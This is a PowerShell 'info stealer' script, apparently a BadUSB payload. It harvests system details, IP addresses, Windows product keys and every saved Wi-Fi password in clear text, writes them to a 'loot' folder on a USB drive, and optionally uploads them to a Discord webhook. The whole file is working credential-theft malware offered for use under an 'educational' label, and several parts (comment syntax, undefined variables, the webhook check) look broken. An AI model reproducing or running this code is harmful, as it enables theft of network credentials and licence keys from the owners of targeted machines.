<#
.SYNOPSIS
    Powershell Info Stealer (Lite Version)

.DESCRIPTION
    Lightweight version that collects essential system information quickly.
    Focuses on the most valuable personal data for security research purposes.

.AUTHOR
    KaazDW: https://github.com/KaazDW
    With the help of the startrk1995's github repo : https://github.com/startrk1995/BadUSB/tree/main

.BUILD DATES
    2025-September
    
.NOTES
    - For educational use only.
    - Always review and test scripts before executing on sensitive systems.    
#>

# SETUP
$timestamp = Get-Date -Format "yyyy-MM-dd_HHmm"
$BBPath = (Get-WmiObject win32_volume -f 'label=''CIRCUITPY''').Name+"loot\$timestamp\"
$LootDir = New-Item -ItemType directory -Force -Path "$BBPath"

# CORE SYSTEM INFO
$sysInfo = [PSCustomObject]@{
    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    ComputerName = $env:COMPUTERNAME
    Username = "$env:USERDOMAIN\$env:USERNAME"
}

# OPERATING SYSTEM
try {
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    $sysInfo | Add-Member -MemberType NoteProperty -Name "OS" -Value "$($os.Caption) (Build $($os.BuildNumber))"
} catch { $sysInfo | Add-Member -MemberType NoteProperty -Name "OS" -Value "N/A" }

# HARDWARE INFO
try {
    $cpu = Get-CimInstance -ClassName Win32_Processor
    $gpu = Get-CimInstance -ClassName Win32_VideoController | Select-Object -First 1
    $ram = [math]::Round((Get-CimInstance -ClassName CIM_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2)
    
    $sysInfo | Add-Member -MemberType NoteProperty -Name "CPU" -Value $cpu.Name.Trim()
    $sysInfo | Add-Member -MemberType NoteProperty -Name "GPU" -Value $gpu.Name.Trim()
    $sysInfo | Add-Member -MemberType NoteProperty -Name "RAM" -Value "$ram GB"
} catch { /* Silently continue */ }

# NETWORK INFO
try {
    $network = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null } | Select-Object -First 1
    $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 3).Content
    
    $sysInfo | Add-Member -MemberType NoteProperty -Name "LocalIP" -Value $network.IPv4Address.IPAddress
    $sysInfo | Add-Member -MemberType NoteProperty -Name "PublicIP" -Value $publicIP
    $sysInfo | Add-Member -MemberType NoteProperty -Name "Gateway" -Value $network.IPv4DefaultGateway.NextHop
} catch { /* Silently continue */ }

# WINDOWS KEYS
try {
    $biosKey = (wmic path softwarelicensingservice get OA3xOriginalProductKey 2>$null | Where-Object { $_ -match '[A-Z0-9]' }).Trim()
    $regKey = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" -Name "BackupProductKeyDefault" -ErrorAction SilentlyContinue).BackupProductKeyDefault
    
    $sysInfo | Add-Member -MemberType NoteProperty -Name "BIOS_Key" -Value $biosKey
    $sysInfo | Add-Member -MemberType NoteProperty -Name "Registry_Key" -Value $regKey
} catch { /* Silently continue */ }

# WI-FI CREDENTIALS
"Wifi knew:" >> "$LootDir\computer_info.txt"
# Not the best way to do it but it works
$profiles = netsh wlan show profiles | Select-String ":\s+(.+?)\s*$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

$wifiInfo = foreach ($profile in $profiles) {
    $profileInfo = (netsh wlan show profile name="$profile" key=clear) -join "`r`n"
    
    "Temp file for Regex: $profile" | Out-File -Append -FilePath "$LootDir\wifi_debug.txt" -Encoding utf8
    $profileInfo | Out-File -Append -FilePath "$LootDir\wifi_debug.txt" -Encoding utf8
    $password = $null
    
    if ($profileInfo -match "Contenu de la cl[^\n]*:\s*([^\n]+)") {
        $password = $matches[1].Trim()
    }
    elseif ($profileInfo -match "Key Content[^\n]*:\s*([^\n]+)") {
        $password = $matches[1].Trim()
    }
    else {
        $lines = $profileInfo -split "`r?`n"
        foreach ($line in $lines) {
            if ($line -match "Contenu de la cl[^:]*:\s*(.+)") {
                $password = $matches[1].Trim()
                break
            }
            elseif ($line -match "Key Content[^:]*:\s*(.+)") {
                $password = $matches[1].Trim()
                break
            }
        }
    }
    
    [PSCustomObject]@{
        PROFILE_NAME = $profile
        PASSWORD = if ($password) { $password } else { "NA" } #Not available
    }
}

# OUTPUT
$output = @"
=== SYSTEM AUDIT (LITE) ===
Generated: $($sysInfo.Timestamp)

[SYSTEM]
Computer: $($sysInfo.ComputerName)
User: $($sysInfo.Username)
OS: $($sysInfo.OS)
CPU: $($sysInfo.CPU)
GPU: $($sysInfo.GPU)
RAM: $($sysInfo.RAM)

[NETWORK]
Local IP: $($sysInfo.LocalIP)
Public IP: $($sysInfo.PublicIP)
Gateway: $($sysInfo.Gateway)

[WINDOWS KEYS]
BIOS Key: $($sysInfo.BIOS_Key)
Registry Key: $($sysInfo.Registry_Key)
WindowsBackupSerial: $($WindowsBackupSerial)

[WI-FI NETWORKS]
$($wifiInfo | Format-Table -AutoSize | Out-String)

"@

# SAVE TO FILE
$output | Out-File -FilePath "$LootDir\computer_info.txt" -Encoding UTF8

# OPTIONAL: UPLOAD TO DISCORD
$webhookUrl = ""
if ($webhookUrl -ne "YOUR_WEBHOOK_URL") {
    $body = @{
        content = "System audit from $($sysInfo.ComputerName)"
        file = Get-Item -Path $outputFile
    }
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data"
}

# CLEANUP (optional)
# Remove-Item -Path $outputFile -Force
Remove-Item -Path $LootDir\wifi_debug.txt -Force